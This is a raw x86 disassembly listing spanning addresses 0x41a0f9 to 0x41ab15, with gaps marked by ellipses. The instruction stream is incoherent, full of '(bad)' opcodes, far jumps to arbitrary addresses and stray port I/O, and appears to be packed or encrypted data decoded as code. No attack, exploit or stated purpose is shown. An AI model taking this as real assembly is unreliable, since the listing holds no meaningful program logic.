  41a0f9:	or     eax,0xfc58c1f
  41a0fe:	sbb    edi,edx
  41a100:	fmulp  st(5),st
  41a102:	lock loope 0x41a145
  41a105:	sbb    al,0x10
  41a107:	aam    0xde
  41a109:	and    DWORD PTR [esi],edi
  41a10b:	dec    esp
  41a10c:	mov    ch,0xdb
  41a10e:	dec    edx
  41a10f:	out    dx,al
  41a110:	adc    BYTE PTR [edi],bl
  41a112:	xchg   esp,eax
  41a113:	loope  0x41a146
  41a115:	cdq    
  41a116:	cwde   
  41a117:	stos   DWORD PTR es:[edi],eax
  41a118:	sbb    edx,DWORD PTR [ebx-0x30]
  41a11b:	push   edi
  41a11c:	mov    ebx,0x95ead003
  41a121:	push   esi
  41a122:	aaa    
  41a123:	faddp  st(6),st
  41a125:	sbb    al,0x30
  41a127:	pop    ecx
  41a128:	adc    ch,0xf8
  41a12b:	(bad)  
  41a12c:	xor    eax,0xd222e0d8
  41a131:	pusha  
  41a132:	and    BYTE PTR ds:0x5b839ad5,ah
  41a138:	mov    cl,0xfc
  41a13a:	add    al,0x5d
  41a13c:	ds inc ebp
  41a13e:	and    eax,0xff5c9dec
  41a143:	loope  0x41a0c9
  41a145:	scas   eax,DWORD PTR es:[edi]
  41a146:	dec    esi
  41a147:	mov    ds:0x50878c5,al
  41a14c:	xor    bh,BYTE PTR [esi]
  41a14e:	mov    esp,0x6225533d
  41a153:	jge    0x41a0df
  41a155:	bound  ebp,QWORD PTR [edi-0x5d66d634]
  41a15b:	push   ds
  41a15c:	jl     0x41a0f8
  41a15e:	lds    edi,FWORD PTR ds:0x54cf238c
  41a164:	rcr    DWORD PTR [eax+0x654892c6],0xa
  41a16b:	scas   al,BYTE PTR es:[edi]
  41a16c:	hlt    
  41a16d:	and    cl,BYTE PTR [ebx+esi*4+0x5d]
  41a171:	test   al,0xc0
  41a173:	ins    BYTE PTR es:[edi],dx
  41a174:	inc    esi
  41a175:	jge    0x41a196
  41a177:	mov    ch,0x9d
  41a179:	push   es
  41a17a:	add    BYTE PTR ds:0x4d7a829e,al
  41a180:	pop    ebp
  41a181:	loop   0x41a15c
  41a183:	nop
  41a184:	and    bh,BYTE PTR [ebp+0x736ed920]
  41a18a:	lock mov eax,0xeb079e4d
	...
  41a1f4:	sbb    al,0xc
  41a1f6:	std    
  41a1f7:	sbb    ebp,edi
  41a1f9:	stc    
  41a1fa:	cld    
  41a1fb:	or     eax,0x398d6850
  41a200:	cmp    BYTE PTR [ebp+0x14e407a2],0x1
  41a207:	add    BYTE PTR [ecx+eax*1],al
  41a20a:	add    BYTE PTR [eax],al
  41a20c:	cmc    
  41a20d:	pop    ds
  41a20e:	call   FWORD PTR [esp+eax*1+0x537290be]
  41a215:	sub    eax,0x9dfc303f
  41a21a:	dec    ebp
  41a21b:	es sub bh,dl
  41a21e:	jl     0x41a289
  41a220:	mov    esi,0x60f20e6
  41a225:	cli    
  41a226:	add    ch,dl
  41a228:	fwait
  41a229:	pop    ds
  41a22a:	and    al,0x5a
  41a22c:	jp     0x41a272
  41a22e:	mov    ebp,0x3176de82
  41a233:	jb     0x41a249
  41a235:	push   edx
  41a236:	leave  
  41a237:	xchg   ebp,eax
  41a238:	outs   dx,DWORD PTR ds:[esi]
  41a239:	jne    0x41a225
  41a23b:	lods   al,BYTE PTR ds:[esi]
  41a23c:	add    ah,BYTE PTR [ebp+0x78b17d1b]
  41a242:	(bad)  
  41a243:	mov    bl,0xd1
  41a245:	mov    esi,0x456189a5
  41a24a:	xlat   BYTE PTR ds:[ebx]
  41a24b:	xchg   ebx,eax
  41a24c:	add    dh,BYTE PTR [edi+ecx*4]
  41a24f:	test   al,bl
  41a251:	jmp    0x86327640
  41a256:	ret    0x41d3
  41a259:	sbb    edx,eax
  41a25b:	fld    DWORD PTR [edi+ebx*1+0x13788481]
  41a262:	sbb    al,0xf0
  41a264:	push   cs
  41a265:	fbld   TBYTE PTR [esi+ecx*1-0xa]
  41a269:	sbb    eax,edi
  41a26b:	sbb    DWORD PTR [esi-0x666ce1e1],ebx
  41a271:	add    ecx,eax
  41a273:	clc    
  41a274:	lds    esp,FWORD PTR [edx]
  41a276:	(bad)  
  41a277:	push   esp
  41a278:	popa   
  41a279:	push   ecx
  41a27a:	sahf   
  41a27b:	inc    ecx
  41a27c:	jg     0x41a20a
  41a27e:	dec    ecx
  41a27f:	sub    eax,0x32ca23d8
  41a284:	lahf   
  41a285:	rcl    BYTE PTR [ebx+0x13c43e49],1
  41a28b:	ror    BYTE PTR [edx-0x7ccc73b5],cl
  41a291:	ret    
  41a292:	stos   DWORD PTR es:[edi],eax
  41a293:	add    DWORD PTR [ecx-0x1a1da0cf],ebx
  41a299:	inc    esp
  41a29a:	mov    ah,0xd2
  41a29c:	(bad)  
  41a29d:	cmp    eax,0xb4eec6c7
  41a2a2:	add    esp,edi
  41a2a4:	or     BYTE PTR [esi],bl
  41a2a6:	or     BYTE PTR cs:[ebx],0x82
  41a2aa:	imul   ecx,ebx,0xf24bd05b
  41a2b0:	dec    ecx
  41a2b1:	sub    eax,0x8cd90731
  41a2b6:	jp     0x41a2af
  41a2b8:	or     esp,DWORD PTR [esp+edx*2]
  41a2bb:	out    0x69,al
  41a2bd:	add    al,0x28
  41a2bf:	clc    
  41a2c0:	test   al,0x40
  41a2c2:	sbb    eax,0xa16b6484
  41a2c7:	add    DWORD PTR [eax],edx
  41a2c9:	cld    
  41a2ca:	pusha  
  41a2cb:	inc    edx
  41a2cc:	push   ebp
  41a2cd:	dec    edx
  41a2ce:	add    edi,eax
  41a2d0:	cmp    eax,0x5c53d7e7
  41a2d5:	out    0x7c,eax
  41a2d7:	popf   
  41a2d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2d9:	aad    0xc
  41a2db:	mov    bl,0xb6
  41a2dd:	cmp    DWORD PTR [edx-0x6b],ecx
  41a2e0:	inc    ecx
  41a2e1:	dec    edi
  41a2e2:	retf   
  41a2e3:	call   0x53ee1510
  41a2e8:	data16 outs dx,BYTE PTR ds:[esi]
  41a2ea:	inc    ebx
  41a2eb:	xor    ebx,DWORD PTR [ecx-0x68bbcc86]
  41a2f1:	mov    dl,0x39
  41a2f3:	cmp    BYTE PTR [edx+eiz*4-0x55209a88],cl
  41a2fa:	sub    dl,BYTE PTR [edi+eiz*4]
  41a2fd:	or     al,0xc5
  41a2ff:	add    bh,ah
  41a301:	pop    ss
  41a302:	xchg   BYTE PTR [ebx+0x2ae5bc25],ch
  41a308:	inc    ebp
  41a309:	xchg   esp,eax
  41a30a:	in     eax,0x24
  41a30c:	mov    ebx,0x75937b
	...
  41a371:	add    BYTE PTR [eax],al
  41a373:	add    bh,dh
  41a375:	pop    eax
  41a376:	test   al,0x13
  41a378:	scas   eax,DWORD PTR es:[edi]
  41a379:	repz (bad) 
  41a37b:	cld    
  41a37c:	adc    eax,0x2a6955c
  41a381:	repz jb 0x41a3bd
  41a384:	call   0x441a49e
  41a389:	add    DWORD PTR [eax],eax
  41a38b:	add    BYTE PTR [ebx-0x5f],cl
  41a38e:	cmp    DWORD PTR [edi],ebp
  41a390:	popa   
  41a391:	push   es
  41a392:	and    ax,0x1015
  41a396:	cmp    bl,bl
  41a398:	aam    0x9f
  41a39a:	popa   
  41a39b:	push   cs
  41a39c:	add    eax,0x5c15fd5
  41a3a1:	pop    ebp
  41a3a2:	aas    
  41a3a3:	retf   0x5957
  41a3a6:	dec    esp
  41a3a7:	mov    eax,ds:0x6b96ae87
  41a3ac:	pop    edi
  41a3ad:	lea    ebx,[eax+edi*1]
  41a3b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3b1:	inc    edi
  41a3b2:	cmp    BYTE PTR [esi+ebx*8],cl
  41a3b5:	sub    ah,BYTE PTR [esi+0x32]
  41a3b8:	sub    edx,DWORD PTR [esi-0x6f]
  41a3bb:	dec    edi
  41a3bc:	and    eax,0xe4ccd4d0
  41a3c1:	pop    ebp
  41a3c2:	(bad)  
  41a3c3:	stc    
  41a3c4:	jns    0x41a3ce
  41a3c6:	add    bh,0xa0
  41a3c9:	test   al,dl
  41a3cb:	sub    al,0x78
  41a3cd:	sub    DWORD PTR [ebp+0x71],ebx
  41a3d0:	pusha  
  41a3d1:	test   DWORD PTR [eax],0xb8c728bd
  41a3d7:	(bad)  
  41a3d8:	mov    ah,0x80
  41a3da:	cdq    
  41a3db:	imul   DWORD PTR [ebp+0x5699c119]
  41a3e1:	jbe    0x41a3bc
  41a3e3:	fwait
  41a3e4:	imul   edx,DWORD PTR gs:[edi],0x40273df9
  41a3eb:	xchg   ebx,eax
  41a3ec:	arpl   WORD PTR [ecx-0x420ea373],cx
  41a3f2:	and    esi,DWORD PTR [ecx]
  41a3f4:	icebp  
  41a3f5:	dec    esp
  41a3f6:	xchg   BYTE PTR [ebp-0x5d42dd1f],dh
  41a3fc:	jg     0x41a44a
  41a3fe:	sub    BYTE PTR [esi-0x3],0x94
  41a402:	imul   edi,DWORD PTR ds:0x9921bf36,0xec498452
  41a40c:	mov    edi,esp
  41a40e:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a410:	and    DWORD PTR [edi+0x25],0xffffffe1
  41a414:	jmp    0x634e:0xa1f1f266
  41a41b:	mov    ebx,0xabe83ab4
  41a420:	dec    esi
  41a421:	inc    esp
  41a422:	cmp    al,0x4
  41a424:	add    al,0xd7
  41a426:	out    0xd3,eax
  41a428:	faddp  st(6),st
  41a42a:	out    dx,al
  41a42b:	jo     0x41a47e
  41a42d:	dec    ebp
  41a42e:	mov    edi,0x44b9930e
  41a433:	cwde   
  41a434:	call   0xc780f4f
  41a439:	and    DWORD PTR [edx+0x752b16f7],ecx
  41a43f:	pop    es
  41a440:	stos   BYTE PTR es:[edi],al
  41a441:	mov    bh,0x66
  41a443:	test   eax,0x6d7f0941
  41a448:	and    cl,BYTE PTR [eax-0x3e54f3ea]
  41a44e:	mov    al,BYTE PTR [ecx]
  41a450:	icebp  
  41a451:	push   ss
  41a452:	sub    al,0x8d
  41a454:	sub    eax,0x3fefd6da
  41a459:	push   ds
  41a45a:	dec    esi
  41a45b:	adc    eax,0x35a20689
  41a460:	mov    dh,0x57
  41a462:	add    eax,0xdff4974a
  41a467:	std    
  41a468:	sub    DWORD PTR [eax+0x45],esp
  41a46b:	imul   edi,DWORD PTR [ebp-0x3b6c9b47],0xb05aa943
  41a475:	or     eax,0x12d13f59
  41a47a:	stos   DWORD PTR es:[edi],eax
  41a47b:	inc    ecx
  41a47c:	adc    BYTE PTR ds:0x1da5d62,0xe9
  41a483:	mov    cl,0xbf
  41a485:	mov    ecx,0xb129e052
  41a48a:	or     DWORD PTR [edi+esi*2],esp
  41a48d:	test   al,0xd5
  41a48f:	lods   al,BYTE PTR ds:[esi]
	...
  41a4f4:	mov    edi,0xff0fcf82
  41a4f9:	dec    edi
  41a4fa:	push   DWORD PTR [edx+0x5f4d0d09]
  41a500:	xchg   ebx,eax
  41a501:	repnz ds enter 0x16ec,0x1
  41a507:	add    BYTE PTR [ecx+eax*1],al
  41a50a:	add    BYTE PTR [eax],al
  41a50c:	aad    0x49
  41a50e:	(bad)  
  41a510:	mov    esp,0xd4c5ea9
  41a515:	mov    BYTE PTR [edx-0x6a],bh
  41a518:	add    dh,BYTE PTR [edi+0x2d]
  41a51b:	jl     0x41a550
  41a51d:	leave  
  41a51e:	mov    al,0xc8
  41a520:	cmp    BYTE PTR ss:[eax+0x6],dh
  41a524:	xchg   esi,eax
  41a525:	xchg   esi,eax
  41a526:	arpl   WORD PTR [edx+0x9],dx
  41a529:	cmc    
  41a52a:	fld    QWORD PTR [edi]
  41a52c:	mov    eax,ds:0x9bf64f8f
  41a531:	mov    edi,DWORD PTR [edi-0xd]
  41a534:	clc    
  41a535:	pop    esi
  41a536:	sbb    eax,0x3cbb4079
  41a53c:	aam    0x45
  41a53e:	fcmove st,st(5)
  41a540:	(bad)  
  41a542:	sbb    eax,edi
  41a544:	mov    al,ds:0x62bf8117
  41a549:	and    ah,BYTE PTR [edi+0x124d2ec]
  41a54f:	cmp    ebp,ebx
  41a551:	push   ebx
  41a552:	retf   
  41a553:	push   eax
  41a554:	mov    ch,0xb6
  41a556:	dec    edx
  41a557:	les    esp,FWORD PTR [edx]
  41a559:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a55a:	int    0xad
  41a55c:	push   eax
  41a55d:	or     al,0x89
  41a55f:	cmp    eax,0x78ee4c1d
  41a564:	xchg   esp,eax
  41a565:	call   0x4c65783b
  41a56a:	xor    DWORD PTR [eax],esi
  41a56c:	and    ah,BYTE PTR [esi+0x64]
  41a56f:	jmp    0x4fad0014
  41a574:	jns    0x41a57d
  41a576:	frstor [eax-0x57889ec5]
  41a57c:	clc    
  41a57d:	outs   dx,DWORD PTR ds:[esi]
  41a57e:	arpl   ax,dx
  41a580:	scas   eax,DWORD PTR es:[edi]
  41a581:	mov    WORD PTR [edx],es
  41a583:	aam    0xac
  41a585:	jp     0x41a595
  41a587:	sub    al,dl
  41a589:	mov    ebp,0xd643f1ba
  41a58e:	or     esp,edx
  41a590:	mov    dh,0xcb
  41a592:	jecxz  0x41a5e9
  41a594:	(bad)  
  41a596:	mov    ds:0x56f239b8,al
  41a59b:	push   esp
  41a59c:	out    0xd2,eax
  41a59e:	push   edi
  41a59f:	scas   eax,DWORD PTR es:[edi]
  41a5a0:	lds    edx,FWORD PTR [ecx-0x1f]
  41a5a3:	js     0x41a556
  41a5a5:	sbb    eax,0x62b7fc23
  41a5aa:	es push edi
  41a5ac:	cmc    
  41a5ad:	test   DWORD PTR [edi-0x54],eax
  41a5b0:	fwait
  41a5b1:	push   cs
  41a5b2:	aam    0x63
  41a5b4:	dec    ebx
  41a5b5:	pop    esi
  41a5b6:	cs cmp cl,dl
  41a5b9:	mov    ds:0x980f4b50,eax
  41a5be:	mov    esp,0x307d7b69
  41a5c3:	jmp    0x41a54f
  41a5c5:	fld    TBYTE PTR [edx+esi*8+0x49]
  41a5c9:	scas   eax,DWORD PTR es:[edi]
  41a5ca:	icebp  
  41a5cb:	mov    esp,0x410fc73e
  41a5d0:	sub    eax,0x2ad551ad
  41a5d5:	cmp    dh,bh
  41a5d7:	ret    
  41a5d8:	and    DWORD PTR [ebx-0x4f8bd6b9],esi
  41a5de:	or     cl,al
  41a5e0:	push   eax
  41a5e1:	add    DWORD PTR [edi-0x482154cf],edi
  41a5e7:	fdivr  st,st(0)
  41a5e9:	scas   al,BYTE PTR es:[edi]
  41a5ea:	lea    esi,[ecx+0x3]
  41a5ed:	push   ds
  41a5ee:	outs   dx,DWORD PTR ds:[esi]
  41a5ef:	inc    edx
  41a5f0:	inc    ebx
  41a5f1:	push   es
  41a5f2:	jle    0x41a578
  41a5f4:	in     eax,0xf9
  41a5f6:	mov    cl,0x9f
  41a5f8:	(bad)  
  41a5fa:	outs   dx,DWORD PTR ds:[esi]
  41a5fb:	xchg   edi,eax
  41a5fc:	outs   dx,DWORD PTR ds:[esi]
  41a5fd:	test   cl,al
  41a5ff:	pop    esi
  41a600:	xchg   BYTE PTR [ebx-0x77cf6e69],bl
  41a606:	cwde   
  41a607:	dec    edi
  41a608:	jecxz  0x41a5d1
  41a60a:	fcomp  DWORD PTR ds:0x754db34e
	...
  41a674:	pop    esp
  41a675:	sub    al,BYTE PTR [ecx]
  41a677:	inc    ecx
  41a678:	ja     0x41a6e5
  41a67a:	pop    esp
  41a67b:	aas    
  41a67c:	dec    ecx
  41a67d:	push   0xc38ca625
  41a682:	cli    
  41a683:	das    
  41a684:	lock pop ss
  41a686:	add    DWORD PTR [eax],eax
  41a688:	add    al,0x1
  41a68a:	add    BYTE PTR [eax],al
  41a68c:	mov    eax,0xc130f86e
  41a691:	push   ss
  41a692:	sbb    esp,DWORD PTR ds:0xb8425993
  41a698:	stc    
  41a699:	jl     0x41a66c
  41a69b:	int3   
  41a69c:	fdiv   QWORD PTR [ebx-0x5]
  41a69f:	and    al,0x33
  41a6a1:	adc    eax,esi
  41a6a3:	ins    DWORD PTR es:[edi],dx
  41a6a4:	ins    DWORD PTR es:[edi],dx
  41a6a5:	jmp    0x21677353
  41a6aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6ab:	and    DWORD PTR [ebp-0x75],esp
  41a6ae:	xchg   edi,eax
  41a6af:	sub    al,0x1a
  41a6b1:	inc    edi
  41a6b2:	(bad)  
  41a6b3:	cmp    edi,ebp
  41a6b5:	iret   
  41a6b6:	push   esp
  41a6b7:	pop    ebp
  41a6b8:	lahf   
  41a6b9:	out    dx,eax
  41a6ba:	xchg   ebp,eax
  41a6bb:	mov    ebp,DWORD PTR [edi-0xa17e22e]
  41a6c1:	cdq    
  41a6c2:	jbe    0x41a686
  41a6c4:	and    dl,BYTE PTR [ebp-0x5be8b72f]
  41a6ca:	das    
  41a6cb:	jle    0x41a6d8
  41a6cd:	stos   BYTE PTR es:[edi],al
  41a6ce:	jmp    0x539092fe
  41a6d3:	mov    eax,ds:0x53288f17
  41a6d8:	dec    edx
  41a6d9:	in     eax,0x61
  41a6db:	mov    bl,0x72
  41a6dd:	scas   eax,DWORD PTR es:[edi]
  41a6de:	push   cs
  41a6df:	jo     0x41a68f
  41a6e1:	mov    al,ds:0x214462dd
  41a6e6:	call   0x2fb9:0x603ce53e
  41a6ed:	cmp    dl,0x1a
  41a6f0:	out    0xb4,al
  41a6f2:	pop    ecx
  41a6f3:	pop    edi
  41a6f4:	xor    bh,BYTE PTR [ebx]
  41a6f6:	cli    
  41a6f7:	(bad)  
  41a6f9:	shl    ah,0x3b
  41a6fc:	mov    BYTE PTR [ecx+0x3e6f8c6],ch
  41a702:	push   esp
  41a703:	or     al,0x11
  41a705:	xchg   ebp,eax
  41a706:	jmp    0x29282796
  41a70b:	aam    0xdb
  41a70d:	mov    cl,0xb6
  41a70f:	outs   dx,DWORD PTR ds:[esi]
  41a710:	stos   BYTE PTR es:[edi],al
  41a711:	loopne 0x41a713
  41a713:	daa    
  41a714:	pop    esp
  41a715:	js     0x41a757
  41a717:	outs   dx,BYTE PTR ds:[esi]
  41a718:	jo     0x41a737
  41a71a:	popa   
  41a71b:	mov    ecx,0x7a9c019b
  41a720:	push   esi
  41a721:	xchg   edi,eax
  41a722:	int3   
  41a723:	dec    ecx
  41a724:	int3   
  41a725:	pop    ecx
  41a726:	fsubrp st(3),st
  41a728:	xchg   edi,eax
  41a729:	out    0xb1,al
  41a72b:	cli    
  41a72c:	and    dh,BYTE PTR [ecx-0x2990d55c]
  41a732:	mov    gs,WORD PTR [ebp+0x10871ced]
  41a738:	and    bh,BYTE PTR [edi]
  41a73a:	sbb    eax,0x92e9c4
  41a73f:	xor    BYTE PTR [edx+0x66],ch
  41a742:	(bad)  
  41a743:	cmp    DWORD PTR [ebx+eiz*1+0x17],0x1
  41a748:	(bad)  
  41a749:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a74a:	pop    esi
  41a74b:	ds xchg esp,eax
  41a74d:	fnstcw WORD PTR [edi+0x46]
  41a750:	dec    ebx
  41a751:	(bad)  
  41a753:	jmp    0x5289bd9b
  41a758:	fidiv  DWORD PTR [edi-0x217fb92e]
  41a75e:	(bad)  
  41a75f:	xchg   DWORD PTR fs:[edx+0x15],edx
  41a763:	ins    DWORD PTR es:[edi],dx
  41a764:	jl     0x41a7a2
  41a766:	mov    bh,0x91
  41a768:	out    dx,eax
  41a769:	xor    esi,DWORD PTR [esi]
  41a76b:	inc    esi
  41a76c:	adc    ebx,0xffffffa7
  41a76f:	jns    0x41a742
  41a771:	inc    edx
  41a772:	push   eax
  41a773:	and    DWORD PTR [ebp-0x6447fe65],0x1a
  41a77a:	add    al,0xea
  41a77c:	or     bl,BYTE PTR [eax]
  41a77e:	adc    DWORD PTR [esi],0x90f530a1
  41a784:	jle    0x41a78d
  41a786:	mov    edx,0xa8658b36
  41a78b:	imul   ebp,eax,0xa274d7
	...
  41a7f1:	add    BYTE PTR [eax],al
  41a7f3:	add    bl,dh
  41a7f5:	xchg   edi,eax
  41a7f6:	jae    0x41a77f
  41a7f8:	ja     0x41a7e1
  41a7fa:	div    edi
  41a7fc:	mov    ds:0xee5327ca,al
  41a801:	arpl   si,bp
  41a803:	lods   al,BYTE PTR ds:[esi]
  41a804:	hlt    
  41a805:	sbb    BYTE PTR [ecx],al
  41a807:	add    BYTE PTR [ecx+eax*1],al
  41a80a:	add    BYTE PTR [eax],al
  41a80c:	add    al,0x87
  41a80e:	mov    dh,0x1c
  41a810:	jmp    0x8c2e:0x3d0ed4fd
  41a817:	and    al,0xf7
  41a819:	daa    
  41a81a:	stc    
  41a81b:	mov    dl,0xa4
  41a81d:	dec    eax
  41a81e:	mov    dh,0x32
  41a820:	scas   al,BYTE PTR es:[edi]
  41a821:	sub    al,0x42
  41a823:	cmp    cl,BYTE PTR [ecx-0x447e321c]
  41a829:	mov    ebp,0x9b91b1a2
  41a82e:	dec    edi
  41a82f:	inc    ecx
  41a830:	es inc dl
  41a833:	sbb    ebp,DWORD PTR [eax+0x64]
  41a836:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a837:	nop
  41a838:	mov    esp,0x357fa40c
  41a83d:	mov    eax,0xf1618613
  41a842:	mov    bl,0x40
  41a844:	ror    BYTE PTR [eax-0x3279da1b],0xd4
  41a84b:	push   eax
  41a84c:	ror    ecx,0x2b
  41a84f:	and    al,0x4f
  41a851:	(bad)  
  41a852:	(bad)  
  41a853:	sti    
  41a854:	fucomp st(3)
  41a856:	push   0x14
  41a858:	bound  ebp,QWORD PTR [edi-0x23]
  41a85b:	test   al,0x2d
  41a85d:	(bad)  
  41a85e:	retf   0x250c
  41a861:	jle    0x41a861
  41a863:	mov    ecx,0xd47d0cfe
  41a868:	sete   cl
  41a86b:	data16 aaa 
  41a86d:	loope  0x41a814
  41a86f:	(bad)  
  41a870:	push   0xc8c8791b
  41a875:	aam    0xd9
  41a877:	retf   
  41a878:	mov    cl,0xf7
  41a87a:	add    ecx,DWORD PTR [esi]
  41a87c:	mov    ecx,0x4164510e
  41a881:	sub    DWORD PTR [ebp-0x7d595bf4],esp
  41a887:	fisttp DWORD PTR [edx+0x7feb3035]
  41a88d:	scas   eax,DWORD PTR es:[edi]
  41a88e:	call   0xa130:0x50efbc3d
  41a895:	cmc    
  41a896:	aaa    
  41a897:	mov    ds:0xf530a98b,eax
  41a89c:	sahf   
  41a89d:	out    0x13,al
  41a89f:	add    bl,ah
  41a8a1:	dec    ecx
  41a8a2:	sbb    al,0x94
  41a8a4:	ja     0x41a8fa
  41a8a6:	and    bh,bl
  41a8a8:	xor    ebx,DWORD PTR [eax]
  41a8aa:	jle    0x41a84a
  41a8ac:	push   esp
  41a8ad:	pushf  
  41a8ae:	sbb    DWORD PTR [ebx+0x5f],ebp
  41a8b1:	mov    edi,esp
  41a8b3:	out    0x3f,eax
  41a8b5:	push   edi
  41a8b6:	test   DWORD PTR [esi+0xe],ebx
  41a8b9:	lea    esi,[ecx]
  41a8bb:	lea    eax,[ebx+ebx*2]
  41a8be:	jmp    0x41a8bf
  41a8c0:	push   eax
  41a8c1:	lods   eax,DWORD PTR ds:[esi]
  41a8c2:	jge    0x41a8a0
  41a8c4:	in     al,dx
  41a8c5:	popa   
  41a8c6:	inc    edx
  41a8c7:	sub    al,0x52
  41a8c9:	stos   DWORD PTR es:[edi],eax
  41a8ca:	ret    0x1d68
  41a8cd:	retf   
  41a8ce:	(bad)  
  41a8cf:	and    al,0x7e
  41a8d1:	ds push esp
  41a8d3:	(bad)  
  41a8d5:	or     esi,DWORD PTR [edx]
  41a8d7:	js     0x41a8b1
  41a8d9:	cmp    eax,DWORD PTR ss:[edx+ecx*1]
  41a8dd:	xchg   esi,eax
  41a8de:	mov    esi,0x20ad944a
  41a8e3:	popf   
  41a8e4:	cwde   
  41a8e5:	(bad)
  41a8e9:	mov    bh,0x90
  41a8eb:	aaa    
  41a8ec:	xor    edx,edi
  41a8ee:	outs   dx,DWORD PTR ds:[esi]
  41a8ef:	lods   eax,DWORD PTR ds:[esi]
  41a8f0:	mov    esi,0xa6070efb
  41a8f5:	xor    DWORD PTR [edx-0x8],0x62da673f
  41a8fc:	ins    DWORD PTR es:[edi],dx
  41a8fd:	inc    ebx
  41a8fe:	or     al,0x6
  41a900:	mov    dh,0x4d
  41a902:	mov    edx,0xa74d66a
  41a907:	ins    DWORD PTR es:[edi],dx
  41a908:	fistp  QWORD PTR [esi-0xbf261fc]
  41a90e:	or     eax,0x85
	...
  41a973:	add    BYTE PTR ds:0xcf4a867e,dh
  41a979:	cli    
  41a97a:	std    
  41a97b:	jg     0x41a9cb
  41a97d:	push   edx
  41a97e:	pushf  
  41a97f:	dec    esp
  41a980:	fwait
  41a981:	or     eax,DWORD PTR es:[ebx+0x119f8]
  41a988:	add    al,0x1
  41a98a:	add    BYTE PTR [eax],al
  41a98c:	xor    DWORD PTR [esi+0x31ab38aa],ecx
  41a992:	test   al,0xb5
  41a994:	inc    ebx
  41a995:	stos   DWORD PTR es:[edi],eax
  41a996:	fisubr WORD PTR [edi-0x4]
  41a999:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a99a:	ficom  DWORD PTR [ebx+0x296a284b]
  41a9a0:	xchg   esp,eax
  41a9a1:	loop   0x41a9a0
  41a9a3:	arpl   WORD PTR [ebp+0x3d6ddf8e],si
  41a9a9:	and    DWORD PTR [edi-0x29a8b187],edx
  41a9af:	xor    BYTE PTR [esi-0x58],ch
  41a9b2:	pop    esp
  41a9b3:	cmp    DWORD PTR [ebp-0x66],0x78
  41a9b7:	in     eax,dx
  41a9b8:	sti    
  41a9b9:	xlat   BYTE PTR ds:[ebx]
  41a9ba:	fmul   DWORD PTR [ecx]
  41a9bc:	mov    ds:0xae04deeb,al
  41a9c1:	push   ebx
  41a9c2:	jecxz  0x41a9d7
  41a9c4:	jecxz  0x41a994
  41a9c6:	js     0x41a976
  41a9c8:	inc    edx
  41a9c9:	xchg   edi,eax
  41a9ca:	out    0x58,al
  41a9cc:	out    dx,eax
  41a9cd:	mov    al,ds:0xb9252b82
  41a9d2:	dec    BYTE PTR ds:0x5d66ac36
  41a9d8:	xor    DWORD PTR [edx],esi
  41a9da:	add    BYTE PTR [edi+0xb],0x2e
  41a9de:	mov    cl,0xde
  41a9e0:	mov    DWORD PTR [edx+0x8],esi
  41a9e3:	sbb    dh,BYTE PTR [ebx+0x6d]
  41a9e6:	mov    ds:0x8e0fdd2f,al
  41a9eb:	sub    DWORD PTR ds:0x65a6a08c,eax
  41a9f1:	adc    ch,al
  41a9f3:	mov    WORD PTR [edx],gs
  41a9f5:	popf   
  41a9f6:	pop    ss
  41a9f7:	cmp    al,0x24
  41a9f9:	inc    eax
  41a9fa:	push   esi
  41a9fb:	sbb    DWORD PTR [edx-0xce82ac4],ebp
  41aa01:	cmp    DWORD PTR [edi],esp
  41aa03:	leave  
  41aa04:	fadd   DWORD PTR ds:0x2bfb60c2
  41aa0a:	jo     0x41aa3b
  41aa0c:	sub    BYTE PTR [eax],bl
  41aa0e:	or     ebx,ebp
  41aa10:	xchg   edx,eax
  41aa11:	or     edi,DWORD PTR [edx-0x58]
  41aa14:	repz mov ch,0xab
  41aa17:	jno    0x41aa24
  41aa19:	into   
  41aa1a:	das    
  41aa1b:	cs dec eax
  41aa1d:	dec    edx
  41aa1e:	mov    edx,DWORD PTR [ebx]
  41aa20:	cmp    eax,0x5c87b97d
  41aa25:	fsubr  QWORD PTR [eax+0x2b]
  41aa28:	xchg   edi,eax
  41aa29:	xchg   edi,eax
  41aa2a:	and    al,0x13
  41aa2c:	add    cl,BYTE PTR [esi-0x429ef84e]
  41aa32:	retf   
  41aa33:	ret    0x892c
  41aa36:	ins    BYTE PTR es:[edi],dx
  41aa37:	hlt    
  41aa38:	jle    0x41aa48
  41aa3a:	rcr    BYTE PTR [edi+0xa],1
  41aa3d:	test   BYTE PTR [ebx+0x11214f01],0xa9
  41aa44:	pop    edx
  41aa45:	mov    ch,0x7c
  41aa47:	push   esp
  41aa48:	push   0xa308318a
  41aa4d:	loop   0x41aa06
  41aa4f:	push   esp
  41aa50:	jge    0x41aacf
  41aa52:	xchg   edi,eax
  41aa53:	jno    0x41aa74
  41aa55:	shr    DWORD PTR [ebp+edi*4-0x4f],cl
  41aa59:	neg    DWORD PTR [ebx-0x11902f6a]
  41aa5f:	push   eax
  41aa60:	mov    bh,BYTE PTR [edx+edi*1+0x32167ee3]
  41aa67:	mov    dl,bl
  41aa69:	imul   edi,DWORD PTR gs:[ecx-0x790cf966],0x66d03fb1
  41aa74:	les    ecx,FWORD PTR [edx]
  41aa76:	xor    DWORD PTR [edx-0x2b],esp
  41aa79:	sub    edi,DWORD PTR [esi-0x4518e71a]
  41aa7f:	add    al,0x80
  41aa81:	fistp  QWORD PTR [esi]
  41aa83:	das    
  41aa84:	sub    bh,BYTE PTR ss:[edi+0x1b]
  41aa88:	rcr    ebx,cl
  41aa8a:	mov    WORD PTR [edi-0xd],?
  41aa8d:	das    
  41aa8e:	(bad)  [ebp+0x0]
	...
  41aaf4:	test   DWORD PTR [ecx],0xfdfeb4dc
  41aafa:	inc    DWORD PTR [ebx+0x5f]
  41aafd:	sbb    BYTE PTR [esi+0x43],ah
  41ab00:	add    BYTE PTR [edi-0x75],cl
  41ab03:	mov    al,0xfc
  41ab05:	sbb    al,BYTE PTR [ecx]
  41ab07:	add    BYTE PTR [ecx+eax*1],al
  41ab0a:	add    BYTE PTR [eax],al
  41ab0c:	pmuludq mm4,QWORD PTR [edi-0x530b4174]
  41ab13:	xchg   ebp,eax
  41ab14:	inc    eax
  41ab15:	and    ebp,edx
